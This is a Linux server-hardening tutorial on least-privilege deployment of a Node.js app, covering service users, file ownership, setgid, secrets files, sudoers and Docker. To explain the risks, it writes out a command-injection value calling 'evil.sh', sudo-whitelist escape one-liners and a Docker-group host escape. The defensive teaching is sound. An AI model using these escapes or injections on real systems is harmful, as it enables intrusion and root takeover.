# 32 — User & Permission Management for Deployments

## ELI5 — The Simple Analogy

Imagine a big office building. You could give every employee a **master key** that opens every door — the server room, the CEO's office, the vault, the janitor's closet. Convenient! Nobody ever gets locked out.

Now a thief steals ONE employee's badge. With a master key, the thief owns the whole building. They walk into the vault, copy every file, and leave a hidden camera behind so they can come back later.

The smart building instead gives each person a badge that opens **only the doors they actually need**. The mail clerk's badge opens the mailroom and nothing else. If a thief steals it, they get... the mailroom. A few envelopes. Not the vault, not the server room, not persistence.

Your Linux server is the building. Your Node.js app is an employee. **Right now, most people's apps run as `root` — the master key.** This topic is about giving your app a badge that opens the mailroom and nothing else, so that the day someone steals it (and in security, it's *when*, not *if*), the blast radius is a mailroom instead of your entire company.

---

## Where This Lives in the Linux Stack

```
Hardware (CPU, RAM, Disk, NIC)
  └── KERNEL
       │   • Every syscall (open, execve, connect, ptrace) is checked
       │     against the CALLING PROCESS'S uid/gid ◀◀◀ the enforcement point
       │   • root (uid 0) bypasses the permission checks
       │
       └── System Calls (setuid, setgid, execve, open — all identity-aware)
            │
            └── C Library (glibc — getpwnam(), initgroups())
                 │
                 └── Userspace identity config
                 │     • /etc/passwd, /etc/shadow, /etc/group (topic 06)
                 │     • /etc/sudoers, /etc/sudoers.d/ ◀◀◀ THIS TOPIC
                 │     • file ownership + mode bits (topic 05) ◀◀◀ THIS TOPIC
                 │
                 └── Shell / systemd / sshd
                       • sshd decides WHO logs in
                       • systemd's User=/Group= decides who the app RUNS as (topic 22)
                       • sudo elevates a specific command
```

**This topic is the practical synthesis of topics 05 (permissions), 06 (users/groups), and 22 (systemd) into one production runbook: how to set up a server so a compromised app can't take the whole box.**

---

## What Is This?

Deploy user and permission management is the practice of running each part of your deployment — the app, the CI/CD deploy agent, the humans — under **separate, minimally-privileged identities**, with file ownership and `sudo` rules arranged so that no single compromised credential grants control of the machine. It is the difference between "the attacker got a shell in my app" being a bad afternoon versus a company-ending breach.

The whole topic is one idea applied everywhere: **the principle of least privilege** — every identity gets exactly the access it needs to do its job, and not one bit more.

---

## Why Does This Matter for a Backend Developer? — The Threat Model FIRST

Before any commands, understand *why*. This is not bureaucracy. This is the difference between a survivable incident and a catastrophe.

**Your Node app has an RCE. It will happen.** Remote Code Execution means an attacker can run arbitrary shell commands as whatever user your app runs as. The ways in are mundane:

- A `child_process.exec('convert ' + req.body.filename)` where `filename` is `"; curl evil.sh | sh"`.
- A dependency with a known CVE (you have hundreds of transitive deps; you have not audited them).
- A path-traversal file write: `fs.writeFile(userPath, data)` where `userPath` is `../../etc/cron.d/backdoor`.
- A deserialization bug, an SSRF that hits the cloud metadata endpoint, a prototype-pollution gadget chain.

Now the fork in the road — **the entire reason this topic exists:**

```
                    ATTACKER GETS RCE IN YOUR NODE APP
                                   │
            ┌──────────────────────┴──────────────────────┐
            ▼                                              ▼
   App runs as ROOT (uid 0)                    App runs as nodeapp (uid 998)
   ───────────────────────                     ─────────────────────────────
   They can:                                   They can:
   • read EVERY secret on the box              • read the app's own env file
     (/etc/shadow, every .env, TLS keys,         (if it's even readable — 640
     the DB password, cloud creds)               root:nodeapp means MAYBE)
   • install a rootkit / kernel module         • write to /srv/app/uploads
   • add a cron job for persistence            • ...that's basically it
   • pivot to the database as a superuser      They CANNOT:
   • rewrite your app's own source code        • read /etc/shadow
     and drop a webshell                       • overwrite the app's own code
   • add SSH keys to root's authorized_keys      (it's owned by deploy, not them)
   • turn off logging and cover their tracks   • install anything system-wide
                                               • persist across a restart
   ═══════════════════════════════════         • read other users' files
   RESULT: they own the ENTIRE machine         ═══════════════════════════════
   and everything it can reach.                RESULT: a shell in a padded cell.
```

The right-hand column is *cheap*. It costs you twenty minutes of setup, once. It is the single highest-leverage security investment you will ever make on a server.

| If you don't understand this... | This will happen... |
|---|---|
| Running the app as root | One RCE = total machine compromise, lateral movement to your DB, persistence you may never find |
| App owns its own code directory | An RCE overwrites your source and drops a webshell — you can't trust the box again |
| `NOPASSWD: ALL` in sudoers | Your "restricted" deploy user is just root with extra steps |
| Editing `/etc/sudoers` by hand | One typo and NOBODY can sudo — if root SSH is off, you are locked out permanently |
| Adding the deploy user to the `docker` group | You just handed out passwordless root and probably don't know it |
| App user can write its own secrets/env file | An RCE rewrites the secret, or reads a value it should only consume |

---

## The Principle of Least Privilege, Concretely

"Least privilege" sounds abstract. Here is what it means as a set of hard rules you can check:

```
┌────────────────────────────────────────────────────────────────────┐
│  IDENTITY          CAN LOG IN?   RUNS WHAT?        CAN SUDO?         │
├────────────────────────────────────────────────────────────────────┤
│  root              no (SSH off)  nothing directly  is root          │
│  you (alice)       yes (SSH key) your shell        yes, w/ password  │
│  deploy            yes (SSH key) CI/CD deploy steps ONLY exact cmds  │
│  nodeapp           NO (nologin)  the Node app      NO — never        │
└────────────────────────────────────────────────────────────────────┘

Rule 1: The app user cannot log in.          (nologin shell)
Rule 2: The app user cannot sudo.            (not in any sudoers rule)
Rule 3: The app user does not own its code.  (deploy owns it, app reads it)
Rule 4: The app user writes ONLY what it must (uploads/, tmp/, maybe logs/)
Rule 5: The deploy user can run ONLY the exact commands CI needs as root.
Rule 6: Humans get the least role that works (adm group to read logs beats sudo).
```

Everything in the runbook below is just these six rules turned into commands.

---

## The Physical Reality — What Identity Looks Like On Disk

An identity is not a mystical thing. It's rows in three text files (topic 06) and a number the kernel stamps on every process.

```
/etc/passwd   (world-readable — account definitions)
   nodeapp:x:998:998:Node app service account:/srv/app:/usr/sbin/nologin
   │       │ │   │   │                        │         └── LOGIN SHELL — nologin!
   │       │ │   │   │                        └── home dir
   │       │ │   │   └── GECOS (comment)
   │       │ │   └── primary GID (998)
   │       │ └── UID (998 — a SYSTEM uid, < 1000)
   │       └── password field: 'x' = "see /etc/shadow"
   └── username

/etc/shadow   (root-only — hashes)
   nodeapp:!:19500:0:99999:7:::
   │       └── '!' or '*' = NO valid password = cannot authenticate by password

/etc/group    (world-readable — group memberships)
   webapps:x:1500:deploy
   │       │ │    └── supplementary members (deploy is IN webapps)
   │       │ └── GID
   │       └── group name
```

And on every process the kernel tracks the identity that all permission checks run against:

```
# PROVE IT: the kernel stamps every process with its identity
cat /proc/$(pgrep -f 'node.*server.js' | head -1)/status | grep -E '^(Uid|Gid|Groups)'
# Uid:  998  998  998  998     (real, effective, saved, filesystem UID)
# Gid:  998  998  998  998
# Groups: 1500                 (supplementary groups — webapps)
```

When your Node process calls `open("/etc/shadow", O_RDONLY)`, the kernel compares *those numbers* against the file's owner/group/mode (topic 05). uid 998 is not 0 and not the file's owner, so the kernel returns `EACCES`. That check is the entire security model. Least privilege is just choosing those numbers wisely.

---

## How It Works — Step by Step: Building the Deploy Setup

This is a complete, copy-pasteable runbook for a fresh Ubuntu 22.04 / Debian 12 box. Run every command as root (or via your bootstrap sudo). Read the reasoning — the *why* is the lesson.

### Step 1 — Create the app's SYSTEM user (cannot log in)

```bash
useradd --system \
        --shell /usr/sbin/nologin \
        --home-dir /srv/app \
        --no-create-home \
        nodeapp
```

Every flag matters:

```
useradd --system --shell /usr/sbin/nologin --home-dir /srv/app --no-create-home nodeapp
        │        │                          │                  │                  │
        │        │                          │                  │                  └── the username
        │        │                          │                  └── do NOT create /srv/app now
        │        │                          │                      (deploy will own it, see step 4)
        │        │                          └── set home to /srv/app (where the app lives)
        │        └── LOGIN SHELL = nologin: even a stolen credential or an RCE
        │            trying `su - nodeapp` gets "This account is currently not
        │            available" and NO interactive shell. (topic 06 callback)
        └── --system: allocate a uid/gid BELOW 1000 (a "system account", by
            convention a daemon, excluded from login screens & UID_MIN ranges)
```

Why `--system`? Human users get uids ≥ 1000; service accounts get < 1000. It's a convention, but tooling respects it: login managers hide system users, and `UID_MIN` in `/etc/login.defs` keeps them out of the interactive-user range. It signals intent: *this is a daemon, not a person.*

Why `nologin` is load-bearing: this is a **topic 06 callback**. The login shell is the program `login`/`su`/`sshd` execs after authenticating. `/usr/sbin/nologin` is a tiny binary that prints a refusal and exits non-zero. So even if an attacker somehow learns a password or forces `su - nodeapp`, there is no shell to drop into. Combined with `!` in `/etc/shadow` (no password) and no SSH key, the `nodeapp` identity is *unreachable as a login* — it exists only to be the owner of a running process.

```
# PROVE IT: nodeapp cannot get a shell
su - nodeapp
# This account is currently not available.   ← nologin did that
```

### Step 2 — Create the `deploy` user (can log in, SSH key only)

```bash
useradd --create-home --shell /bin/bash deploy
passwd -l deploy                      # LOCK the password: SSH-key login ONLY, never a password
mkdir -p /home/deploy/.ssh
chmod 700 /home/deploy/.ssh
# paste CI's PUBLIC key (topic 24) into authorized_keys:
printf 'ssh-ed25519 AAAA...ci-runner\n' > /home/deploy/.ssh/authorized_keys
chmod 600 /home/deploy/.ssh/authorized_keys
chown -R deploy:deploy /home/deploy/.ssh
```

`passwd -l deploy` puts a `!` in front of the hash so no password will ever authenticate — the only way in is the SSH key. This is the CI/CD identity: it clones the repo, builds, and restarts the service, but it is *not* root and it is *not* the app.

### Step 3 — Create the shared GROUP so deploy writes and nodeapp reads

```bash
groupadd --system webapps
usermod -aG webapps deploy        # deploy is now a supplementary member of webapps
usermod -aG webapps nodeapp       # nodeapp too
```

The shared group `webapps` is the bridge. `deploy` (via the group) can write the code; `nodeapp` (via the group) can read it. Neither needs to own the other's files. This is the mechanism that lets two separate identities cooperate on one directory without either being root and without opening the files to the world (topic 06 — supplementary groups).

### Step 4 — Directory layout & ownership — the KEY INSIGHT

Here is the single most important idea in this topic:

> **The app user must NOT own its own code.**

Code is owned by `deploy:webapps`. It is writable by deploy (who deploys it) and *readable but not writable* by nodeapp (who runs it). Only the few directories the app genuinely must write to are owned by `nodeapp`.

Why? Because if `nodeapp` owns its own source and an RCE strikes, the attacker can **overwrite your application code and drop a webshell** — a persistent backdoor that survives restarts and looks like your app. When deploy owns the code and the app can only read it, the RCE *cannot modify the running application*. This is a huge, cheap win.

```bash
# The release directory the code lives in:
mkdir -p /srv/app
chown -R deploy:webapps /srv/app          # deploy owns, webapps group (nodeapp can read)
chmod -R 750 /srv/app                      # rwx owner, r-x group, --- other

# The setgid bit (step 5, but set it here):
chmod g+s /srv/app

# The few dirs the app MUST write to → owned by nodeapp:
mkdir -p /srv/app/uploads /srv/app/tmp
chown nodeapp:webapps /srv/app/uploads /srv/app/tmp
chmod 770 /srv/app/uploads /srv/app/tmp    # app writes; group can read; other nothing
```

Reasoning per line:

```
chown -R deploy:webapps /srv/app
  → OWNER = deploy   (the only identity that should MODIFY code)
  → GROUP = webapps  (nodeapp is in this group → gets GROUP permissions)

chmod -R 750 /srv/app
  → 7 (owner=deploy)  = rwx  → deploy can read, write, traverse
  → 5 (group=webapps) = r-x  → nodeapp can READ and traverse, NOT write ← the win
  → 0 (other)         = ---  → every other account: nothing. Not even list.

chown nodeapp:webapps /srv/app/uploads
  → OWNER = nodeapp  → the app can now WRITE here (and only here)

chmod 770 /srv/app/uploads
  → 7 (owner=nodeapp) = rwx → app reads/writes uploads
  → 7 (group=webapps) = rwx → deploy (in webapps) can manage uploads too
  → 0 (other)         = --- → nobody else
```

The mental picture:

```
/srv/app                     deploy:webapps  drwxr-s---   ← 750 + setgid, CODE (app read-only)
├── dist/                     deploy:webapps  drwxr-s---   ← built JS, app can't modify
│   └── server.js             deploy:webapps  -rw-r-----   ← 640, app READS, cannot write
├── node_modules/             deploy:webapps  drwxr-s---   ← deps, app can't modify
├── package.json              deploy:webapps  -rw-r-----
├── uploads/                  nodeapp:webapps drwxrws---   ← 770, app WRITES here
└── tmp/                      nodeapp:webapps drwxrws---   ← 770, scratch space
```

### Step 5 — setgid on the shared dir (the CI drift fix)

You already ran `chmod g+s /srv/app`. Here's *why it is essential* — this is the **topic 05 setgid-on-a-directory** case, and it is the fix for the maddening "works when I deploy by hand, breaks from CI" bug.

Normally, a new file's group = the *creating process's primary group*. So when `deploy` (primary group `deploy`) creates a file, it's owned `deploy:deploy` — and `nodeapp` is **not** in the `deploy` group, so `nodeapp` cannot read it. Your deploy "succeeds" but the app throws `EACCES` on files it can't see.

setgid on a *directory* changes the rule: **new files inside inherit the directory's group**, not the creator's primary group.

```
Without setgid on /srv/app:
   deploy creates dist/new.js  →  owned  deploy:deploy   →  nodeapp CANNOT read ✗

With setgid (chmod g+s) on /srv/app:
   deploy creates dist/new.js  →  owned  deploy:webapps  →  nodeapp CAN read ✓
                                              ▲
                                    inherited from the dir, not from deploy
```

You can see it in `ls -l` as an `s` where the group-execute `x` would be: `drwxr-s---`. (A capital `S` means setgid is set but group-execute is off — usually a mistake on a directory.)

```
# PROVE IT: setgid makes new files inherit the webapps group
sudo -u deploy touch /srv/app/dist/proof.txt
ls -l /srv/app/dist/proof.txt
# -rw-r----- 1 deploy webapps 0 ... proof.txt   ← group is webapps, NOT deploy
```

**Caveat:** setgid only affects files created *after* it's set, and only in *that* directory (it's inherited by new subdirs but existing subdirs keep their old bit). After turning it on, re-normalize existing files: `chgrp -R webapps /srv/app && chmod -R g+s $(find /srv/app -type d)`.

### Step 6 — umask for the deploy user (topic 05 callback)

setgid fixes the *group*; `umask` fixes the *mode*. A **topic 05 callback**: `umask` is the mask of bits *removed* from the default mode of newly created files. If deploy's umask is the permissive `0002`, new files are `664` / dirs `775` — **world-readable**. On a shared box, that leaks your code and configs to every account.

Set a tight umask so new files are *not* world-readable:

```bash
# In /home/deploy/.profile (or the systemd deploy unit's UMask=):
umask 027      # removes: nothing from owner, write from group, ALL from other
#              → new files 640, new dirs 750  → matches our 750 layout, other = ---
```

```
umask 027 math:   default file 666, default dir 777
   666 & ~027 = 666 & 750 = 640   (rw-r-----)
   777 & ~027 = 777 & 750 = 750   (rwxr-x---)
```

For the app itself, set `UMask=0027` in the systemd unit (topic 22) so files the *app* creates (in uploads/) also aren't world-readable.

### Step 7 — Secrets: root writes, app reads, nobody else opens

Your DB password, API keys, and JWT secret live in an environment file — **not in the repo, not in the image** (that's topic 33's job to explain fully). The ownership is the security boundary:

```bash
mkdir -p /etc/myapp
printf 'DATABASE_URL=postgres://app:s3cr3t@db.internal/prod\nJWT_SECRET=...\n' \
    > /etc/myapp/env
chown root:nodeapp /etc/myapp/env      # root OWNS (writes), nodeapp GROUP (reads)
chmod 640 /etc/myapp/env               # rw- r-- ---
```

The mode is the whole point:

```
chmod 640 /etc/myapp/env  →  -rw-r-----  root:nodeapp
   6 (owner=root)    = rw-  → only root can WRITE the secret
   4 (group=nodeapp) = r--  → the app can READ it (and ONLY read)
   0 (other)         = ---  → no other account can even OPEN it — EACCES on open()
```

Two non-negotiable properties:

1. **The app can read but NOT write its own secrets.** If nodeapp could write `/etc/myapp/env`, an RCE could rewrite `DATABASE_URL` to point at an attacker's DB (credential harvesting) or read-modify to escalate. Owner = `root`, not `nodeapp`. The app is a *consumer* of config, never an *author* of it.
2. **No account other than root and the app can open it.** `other = ---` means even another logged-in developer gets `EACCES`.

Wire it into systemd (topic 22 callback):

```ini
# /etc/systemd/system/myapp.service  (excerpt — full unit is in topic 33)
[Service]
User=nodeapp
Group=nodeapp
EnvironmentFile=/etc/myapp/env       # systemd (as root) reads it and injects the vars
ExecStart=/usr/bin/node /srv/app/dist/server.js
```

systemd itself reads the file as root at start time and hands the variables to the process — the process never has to open the file, which means you could even make it `600 root:root` if systemd is the only reader. But `640 root:nodeapp` is the safe default when something (a healthcheck script running as nodeapp) also needs it.

### The finished layout — every line explained

```
# ls -l /srv/app  and  ls -l /etc/myapp
drwxr-s--- 6 deploy  webapps 4096 Jul 12 10:00 /srv/app
│└┬┘└┬┘└┬┘   └──┬─┘  └──┬──┘
│ │  │  │       │       └── GROUP webapps → nodeapp (a member) gets these bits: r-x
│ │  │  │       └── OWNER deploy → gets rwx (deploys code)
│ │  │  └── other: --- → no other account can even LIST the dir
│ │  └── group: r-s → r-x PLUS setgid 's' → new files inherit webapps group
│ └── owner: rwx → deploy can read/write/traverse
└── 'd' = directory

-rw-r----- 1 deploy  webapps  812 Jul 12 10:00 /srv/app/dist/server.js
   → 640 deploy:webapps: deploy wrote it, nodeapp READS it, cannot modify. RCE-safe.

drwxrws--- 2 nodeapp webapps 4096 Jul 12 10:05 /srv/app/uploads
   → 770 + setgid nodeapp:webapps: the ONE place the app writes. 's' keeps group tidy.

-rw-r----- 1 root    nodeapp   96 Jul 12 10:02 /etc/myapp/env
   → 640 root:nodeapp: root wrote the secret, app reads it, app CANNOT rewrite it,
     no other account can open it.
```

---

## sudoers — In Real Depth

`sudo` lets one identity run a command *as another* (usually root), governed by `/etc/sudoers` and drop-in files in `/etc/sudoers.d/`. For a deploy pipeline, sudo is how the unprivileged `deploy` user is allowed to do the *two or three* privileged things it truly needs (restart the service, reload nginx) — and nothing else.

### Drop a file in /etc/sudoers.d/, don't edit the main file

```bash
# RIGHT: a package-upgrade-safe drop-in, syntax-checked before it saves
visudo -f /etc/sudoers.d/deploy
```

Never open `/etc/sudoers` in a normal editor. Two reasons:

1. **Drop-ins survive package upgrades.** Editing the main `/etc/sudoers` risks your changes being clobbered (or prompting a conflict) when `sudo` is upgraded. A file in `/etc/sudoers.d/` is yours and stays.
2. **`visudo` SYNTAX-CHECKS BEFORE SAVING.** This is not optional.

### visudo, at maximum volume

> **ALWAYS use `visudo` (or `visudo -f /etc/sudoers.d/deploy`). Never edit a sudoers file with a plain editor. Ever.**

Here is why, said as loudly as it can be said:

```
A single syntax error in a sudoers file means sudo REFUSES TO PARSE IT.
When sudo can't parse its config, NOBODY can sudo — not you, not anyone.

>>> "sudo: parse error in /etc/sudoers near line 42
>>>  sudo: no valid sudoers sources found, quitting"

If you also disabled root SSH login (topic 35 — and you SHOULD), you now have:
   • no way to sudo (config broken)
   • no way to log in as root (SSH root disabled)
   • = LOCKED OUT of your own server, PERMANENTLY, short of a
     cloud rescue instance / single-user boot / physical console.
```

`visudo` prevents this by opening the file in an editor, and **on save it parses the result and refuses to write it if the syntax is invalid**, letting you fix it instead of committing the mistake. It also locks the file so two admins can't clobber each other. There is no situation where hand-editing sudoers is worth the risk.

```bash
# Set which editor visudo uses (default is vi):
EDITOR=nano visudo -f /etc/sudoers.d/deploy
# ALWAYS check a drop-in you wrote by other means before trusting it:
visudo -c -f /etc/sudoers.d/deploy      # -c = check-only, prints "parsed OK" or the error
```

### The rule syntax — annotated token by token

```
deploy      ALL = (ALL)    NOPASSWD:  /bin/systemctl restart myapp
│           │     │        │          │
│           │     │        │          └── COMMAND(S) allowed (exact path + args)
│           │     │        └── TAG: don't prompt for deploy's password (CI has no TTY)
│           │     └── RUNAS: which user(s) deploy may become — (ALL) = anyone incl root
│           └── HOST: on which hosts this rule applies — ALL = every host
└── WHO: the user (or %group) this rule is for
```

Read it as a sentence: "**deploy**, on **any host**, may run **as anyone (incl. root)**, **without a password**, the command **`/bin/systemctl restart myapp`**." Notice it lists *one exact command*. That is the goal.

### The critical security lesson: NOPASSWD: ALL is just "give deploy root"

```
# WRONG — this is root with extra steps:
deploy ALL=(ALL) NOPASSWD: ALL
```

`NOPASSWD: ALL` means deploy can run *any command* as root without even a password. That is not a restricted account; that is **root with a different name**. An attacker who gets deploy's SSH key gets the whole box. If you write this, you have gained nothing over just running the app as root.

```
# RIGHT — grant ONLY the exact commands CI needs:
deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp, \
                            /usr/bin/systemctl reload nginx
```

Two commands. Deploy can restart the app and reload nginx. It cannot read `/etc/shadow`, cannot add users, cannot install packages, cannot get a root shell. If deploy's key is stolen, the attacker can... restart your app. Annoying, not fatal.

### Command-whitelist BYPASS TRAPS — what makes a "restricted" rule useless

This is the part everyone gets wrong. A whitelist of commands is only a boundary if none of those commands can be turned into *arbitrary code execution as root*. Many innocent-looking commands can. If your rule allows any of these, your "restricted" sudo is decorative:

```
TRAP                          WHY IT'S A FULL ROOT SHELL
──────────────────────────    ────────────────────────────────────────────────
sudo vim  (or vi, nano-ish)   inside vim:  :!sh   → spawns a shell as ROOT
sudo less / more / man        press  !sh   (or 'v' to edit) → ROOT shell
sudo find ... -exec           find / -exec sh \;  → runs sh as ROOT
sudo awk / sed / ed / tar     awk 'BEGIN{system("sh")}'; tar --checkpoint-action=exec=sh
sudo systemctl  (UNrestricted) systemctl edit --full any.service, point ExecStart
                              at /bin/sh, start it → arbitrary command AS ROOT.
                              Also `systemctl link` a unit you wrote.
sudo npm / node / python      npm run <arbitrary>, node -e 'require("child_process")...'
                              → run any JS/code AS ROOT. Package installs run scripts too.
sudo docker (see below)       docker run -v /:/host ... → own the host filesystem
ANY script deploy can WRITE   they edit the script, then sudo-run it → ROOT.  ← huge one
Wildcards in the command path sudo /opt/deploy/*.sh  → they drop evil.sh and run it
```

Two of these deserve extra emphasis:

**The writable-script trap.** Suppose you allow `deploy ALL=(root) NOPASSWD: /srv/scripts/deploy.sh`. If that script is owned by `deploy` (or is group/other-writable), deploy can simply *edit it* to `#!/bin/sh\nbash` and run it as root. **The whitelisted script MUST be root-owned and NOT writable by the sudoer:**

```bash
chown root:root /srv/scripts/deploy.sh
chmod 755 /srv/scripts/deploy.sh      # deploy can execute + read, CANNOT write
# verify deploy cannot modify it:
sudo -u deploy sh -c 'echo x >> /srv/scripts/deploy.sh'   # → Permission denied ✓
```

**Unrestricted `systemctl`.** `sudo systemctl` looks safe — it just manages services, right? No. With unrestricted systemctl you can `systemctl edit --full` any unit (or create a new one), set `ExecStart=/bin/sh -c 'evil'`, and `systemctl start` it — arbitrary command execution as root. Always restrict to *specific verbs and units*: `systemctl restart myapp`, never bare `systemctl`.

### sudo diagnostics & mechanics

```bash
sudo -l                       # "what can I actually run?" — lists YOUR sudo rules
                              # run this AS deploy to audit exactly what CI can do
sudo -u nodeapp -H bash       # become nodeapp (with -H = set HOME) to TEST as the app:
                              #   reproduce the app's permission view. -H matters so
                              #   $HOME points at /srv/app, not your own home.
sudo -u nodeapp -H node -e 'require("fs").writeFileSync("/srv/app/dist/x","")'
                              # → EACCES, proving the app truly can't write its code
```

`sudo` vs `su -` vs `sudo -i` vs `sudo su -`:

```
su -            → switch user by authenticating AS THE TARGET (need target's password).
                  '-' = login shell (fresh env, target's .profile). Historically needs
                  the ROOT password → which is why sudo exists (no shared root password).
sudo <cmd>      → run ONE command as another user, authenticating with YOUR OWN password,
                  governed by sudoers. Auditable per-command. The modern way.
sudo -i         → start an interactive root LOGIN shell (like `su -`) via sudo — clean
                  root environment, runs root's .profile. Preferred for "become root".
sudo su -       → sudo runs `su -`, which then starts a root login shell. Works, but it's
                  two tools stacked; `sudo -i` is the direct equivalent. su's env rules
                  differ subtly (PATH, HOME) — prefer `sudo -i`.
```

### Defaults worth knowing

```
Defaults        timestamp_timeout=15     # minutes sudo remembers your password (0 = always ask)
Defaults        requiretty               # (older default) require a real TTY — breaks CI!
Defaults:deploy !requiretty              # turn it OFF for the deploy user (CI has no TTY)
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
                #  ↑ sudo IGNORES the caller's $PATH and uses THIS — prevents a hijacked
                #    PATH from making `sudo systemctl` run a fake systemctl. Security win.
Defaults        logfile="/var/log/sudo.log"   # extra sudo logging beyond auth.log
```

### sudo is LOGGED — the audit trail (topic 35 link)

Every `sudo` invocation is logged to `/var/log/auth.log` (Debian/Ubuntu) — who ran what, as whom, from which TTY, and whether it was allowed or denied. This is your **audit trail** and forensic record.

```
# PROVE IT: see the audit trail
grep sudo /var/log/auth.log | tail -5
# Jul 12 10:31:02 web1 sudo:  deploy : TTY=pts/0 ; PWD=/srv/app ;
#   USER=root ; COMMAND=/usr/bin/systemctl restart myapp
# Jul 12 10:33:10 web1 sudo:  deploy : command not allowed ; TTY=pts/0 ;
#   USER=root ; COMMAND=/bin/bash          ← a DENIED attempt — investigate this
```

A denied `sudo` for `/bin/bash` from your deploy user at 3am is a signal someone is probing. This links directly to topic 35 (reading auth.log, fail2ban). Never disable this logging.

### Groups for humans — `adm` beats sudo for log access

Not every developer needs sudo. A very common need is "let Alice *read the logs* to debug." Handing out sudo for that is wildly over-privileged. Instead, add her to the `adm` group, which owns `/var/log`:

```bash
adduser alice adm        # or: usermod -aG adm alice
# now Alice can read /var/log/* WITHOUT sudo and without any write/root power
```

```
# PROVE IT: adm group grants log read access
ls -l /var/log/syslog
# -rw-r----- 1 syslog adm 12345 Jul 12 ... /var/log/syslog
#                   ▲── group 'adm' → members can READ. That's often ALL a dev needs.
```

Least privilege for humans: give the *narrowest* group that solves the problem. `adm` (read logs), `docker` (careful — see below), a project group for a code dir — before ever reaching for sudo.

---

## The Docker Angle — Essential and Under-Appreciated

Docker quietly undoes everything above if you're not careful. Three traps.

### Trap 1 — Dockerfiles run as ROOT by default

Most Dockerfiles have no `USER` instruction. **The default user in a container is root (uid 0).** So `node server.js` inside that container is running as root — inside the container's namespace, yes, but that root is *mapped to real root on the host* unless you use user namespaces. Every "run as an unprivileged user" lesson above is silently voided.

```dockerfile
# WRONG (implicit): no USER line → the CMD runs as ROOT
FROM node:20-slim
WORKDIR /app
COPY . .
RUN npm ci --omit=dev
CMD ["node", "dist/server.js"]        # ← runs as root!

# RIGHT: drop to the built-in unprivileged 'node' user
FROM node:20-slim
WORKDIR /app
COPY --chown=node:node . .
RUN npm ci --omit=dev
USER node                              # ← everything after runs as uid 1000 'node'
CMD ["node", "dist/server.js"]
```

The official `node` images ship a `node` user (uid 1000) exactly for this. Add `USER node`. It is one line and it is the container equivalent of the whole runbook above.

### Trap 2 — The bind-mount UID clash (the infuriating "permission denied on my own file")

Run a root-in-container process that writes into a **host bind mount**, and the files land on the host owned by *uid 0*. Back on the host, *you* (uid 1000) now can't delete them:

```bash
docker run -v "$PWD":/app node:20 sh -c 'touch /app/root-made-this.txt'
ls -l root-made-this.txt
# -rw-r--r-- 1 root root 0 ... root-made-this.txt   ← owned by ROOT on your host
rm root-made-this.txt
# rm: cannot remove 'root-made-this.txt': Permission denied   ← you "own" the dir but not the file
```

Cause: UIDs are just *numbers*, shared between container and host (without user namespaces). Container-root writes as uid 0; host sees uid 0 = root. The fix is to run the container as *your* uid/gid:

```bash
docker run -v "$PWD":/app --user "$(id -u):$(id -g)" node:20 \
    sh -c 'touch /app/now-yours.txt'
ls -l now-yours.txt
# -rw-r--r-- 1 youruser yourgroup 0 ... now-yours.txt   ← owned by YOU ✓
```

`--user $(id -u):$(id -g)` makes the container process run as your host identity, so files it creates in the mount are owned by you. (To fix an already-root-owned mess: `sudo chown -R $(id -u):$(id -g) .`.)

### Trap 3 — THE BIG ONE: the `docker` group = passwordless root

> **Adding a user to the `docker` group is EXACTLY equivalent to giving them passwordless root on the host.**

The Docker daemon runs as root. Anyone who can talk to it (i.e. anyone in the `docker` group) can ask it to do root things. The trivial exploit:

```bash
# a 'docker'-group user, no sudo needed, walks out onto the host:
docker run -v /:/host --privileged -it alpine chroot /host sh
# → a root shell on the HOST filesystem. Read /etc/shadow, add SSH keys, anything.
```

Mounting `/` into a container as root gives full read/write of the host disk. `--privileged` drops the remaining guardrails. There is *no* privilege boundary between the docker group and root. So the well-meaning advice "just add the deploy user to the docker group so CI can build images" **is granting the deploy user passwordless root** — quietly undoing the entire least-privilege setup.

Same danger with **mounting `/var/run/docker.sock` into a container** (topic 28 callback — it's a Unix domain socket). A container with the docker socket can spin up *sibling* containers with `-v /:/host` and escape to the host. Treat `docker.sock` access as root access. Never mount it into an app container; be extremely wary of CI setups that do.

### The mitigation: rootless containers / Podman

- **Rootless Docker** and **Podman** run the container engine as a *non-root user* using user namespaces: container-uid-0 maps to your *unprivileged* host uid, so a container escape lands you as a nobody, not as host-root. Bind-mount files come out owned by you, and there's no root daemon to hijack.
- Podman is daemonless and rootless by default and is a near drop-in for the `docker` CLI. On a server where you don't want a `docker` group handing out root, it's the safer default.

---

## Deploy User Hardening Checklist

```
[ ] App runs as a dedicated --system user with /usr/sbin/nologin
[ ] App user has '!' in /etc/shadow (no password) and NO SSH key
[ ] App user is in NO sudoers rule
[ ] App does NOT own its own code (deploy:webapps owns it; app reads via group)
[ ] Only uploads/tmp/ (the dirs the app truly writes) are owned by the app user
[ ] Shared code dir is chmod 750, group = webapps, with setgid (g+s) set
[ ] deploy user's umask is 027 (new files not world-readable)
[ ] Secrets file is /etc/myapp/env, chmod 640, owned root:nodeapp (app READS only)
[ ] deploy user: password locked (passwd -l), SSH-key login only
[ ] sudoers edited ONLY via visudo, as a drop-in in /etc/sudoers.d/
[ ] deploy sudo rule lists EXACT commands (no NOPASSWD: ALL, no bare systemctl)
[ ] Any sudo-run script is root-owned and NOT writable by the sudoer
[ ] No wildcards in sudoers command paths; no vim/less/find/awk/npm/node in the list
[ ] `sudo -l` as deploy shows only the intended commands
[ ] Nobody is in the `docker` group who shouldn't have full root
[ ] docker.sock is not mounted into app containers
[ ] Dockerfiles have USER (not implicit root); rootless/Podman considered
[ ] Humans who only need logs are in `adm`, not sudo
[ ] root SSH login disabled (topic 35) — with sudo verified working FIRST
```

---

## Exact Syntax Breakdown

```
useradd --system --shell /usr/sbin/nologin --home-dir /srv/app --no-create-home nodeapp
        │        │                          │                  │                 └─ name
        │        │                          │                  └─ don't make the home dir
        │        │                          └─ home directory path
        │        └─ login shell = nologin (no interactive shell EVER)
        └─ system account (uid < 1000)

chmod 750 /srv/app        chmod g+s /srv/app       chmod 640 /etc/myapp/env
      │   │                     │   │                     │   │
      │   └─ target             │   └─ target             │   └─ target
      └─ 7=rwx owner            └─ g+s = setgid:          └─ 6=rw- owner (root)
         5=r-x group               new files inherit        4=r-- group (nodeapp)
         0=--- other               the dir's group          0=--- other

visudo -f /etc/sudoers.d/deploy        sudo -u nodeapp -H bash
       │  │                                 │  │       │  └─ command to run
       │  └─ edit THIS drop-in file         │  │       └─ set HOME to target's home
       └─ open+syntax-check+lock            │  └─ run AS this user
